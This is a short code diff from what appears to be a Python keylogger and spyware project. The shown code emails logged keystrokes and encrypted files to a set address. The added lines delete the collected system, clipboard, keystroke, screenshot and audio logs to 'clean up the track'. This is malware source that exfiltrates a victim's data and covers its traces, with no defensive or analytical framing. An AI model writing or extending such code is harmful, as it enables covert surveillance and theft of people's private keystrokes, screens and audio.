@@ -102,7 +102,7 @@ def send_mail(filename, attachment, toaddr):
     s.quit()
 
 
-send_mail(keys_information, file_path + extend + keys_information, toaddress)
+send_mail(keys_information, file_merge + keys_information, toaddress)
 
 
 
@@ -248,4 +248,9 @@ for encrypting_file in files_to_encrypt:
     send_mail(encrypted_file_names[count], encrypted_file_names[count], toaddress)
     count += 1
 
-    time.sleep(120)
+time.sleep(120)
+
+# Clean up the track and delete the files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)
